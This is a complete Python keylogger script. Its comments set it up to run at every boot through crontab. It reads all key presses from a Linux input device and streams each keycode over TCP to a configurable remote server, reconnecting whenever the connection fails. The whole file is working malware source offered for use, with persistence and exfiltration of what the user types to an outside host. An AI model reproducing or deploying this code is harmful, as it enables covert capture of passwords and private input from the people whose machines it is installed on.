#!/usr/bin/env python3
## chmod +x keylogger.py
## crontab -e
## @reboot /full/path/to/keylogger.py
"""
keylogger.py
This script logs keystrokes from a specified input device and sends them
to a remote server over a TCP connection.

Usage:
    - Adjust REMOTE_IP and REMOTE_PORT to match your remote listener.
    - Ensure the input device path (e.g. '/dev/input/event0') is correct for your setup.
"""

import socket
import time
from evdev import InputDevice, categorize, ecodes

# Configure your remote server's IP and port.
REMOTE_IP = "YOUR_REMOTE_IP"
REMOTE_PORT = YOUR_REMOTE_PORT

# The input device file; adjust if necessary.
INPUT_DEVICE = "/dev/input/event0"

def connect_to_server():
    """
    Continuously attempts to connect to the remote server.
    Returns a connected socket.
    """
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((REMOTE_IP, REMOTE_PORT))
            print(f"[*] Connected to {REMOTE_IP}:{REMOTE_PORT}")
            return s
        except Exception as e:
            print(f"[!] Connection failed: {e}. Retrying in 10 seconds.")
            time.sleep(10)

def main():
    # Attempt to connect to the remote server.
    conn = connect_to_server()

    try:
        # Open the input device.
        dev = InputDevice(INPUT_DEVICE)
        print(f"[*] Listening for keystrokes on {INPUT_DEVICE} ...")
    except Exception as e:
        print(f"[!] Failed to open input device {INPUT_DEVICE}: {e}")
        return

    # Read events from the device indefinitely.
    for event in dev.read_loop():
        if event.type == ecodes.EV_KEY:
            key_event = categorize(event)
            # We log only when a key is pressed down.
            if key_event.keystate == 1:
                # Create the message to send.
                msg = f"{key_event.keycode}\n"
                print(f"[*] Detected: {msg.strip()}")
                try:
                    conn.sendall(msg.encode())
                except Exception as e:
                    print(f"[!] Send failed: {e}. Reconnecting...")
                    try:
                        conn.close()
                    except Exception:
                        pass
                    # Attempt to reconnect if the connection is lost.
                    conn = connect_to_server()

if __name__ == '__main__':
    main()
